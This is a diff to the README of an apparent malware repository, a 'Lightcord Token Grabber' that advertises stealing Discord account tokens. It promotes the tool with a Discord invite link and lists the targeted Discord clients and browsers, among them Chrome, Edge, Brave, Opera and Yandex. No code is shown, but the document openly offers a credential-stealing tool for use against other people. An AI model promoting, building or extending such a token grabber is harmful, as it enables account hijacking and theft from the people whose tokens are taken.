@@ -1,2 +1,37 @@
-# Discord-Token-Grabber
-Discord Token Grabber, Fist grabber Lightcord
+# First Lightcord Token Grabber
+
+# [Discord RCΛ](https://discord.gg/tdCs8d448S) 
+
+![Frame 1cafe movie](https://media.discordapp.net/attachments/829786162771525665/829809303900520458/EL1T3.gif)
+
+```css
+# Application:
+  - Discord
+  - Lightcord
+  - discordptb
+  - discordcanary
+  - Opera Stable
+  - Opera GX Stable
+
+# Naviguateur:
+  - Amigo
+  - Torch
+  - Kometa
+  - Orbitum
+  - CentBrowser
+  - 7Star
+  - Sputnik
+  - Vivaldi
+  - Google Chrome SxS
+  - Epic Privacy Browser
+  - Google Chrome
+  - Uran
+  - Microsoft Edge
+  - Yandex
+  - Opera 
+  - Opera Neon
+  - Opera GX
+  - Brave
+```
+
+# Made by Monstered (Official repository)
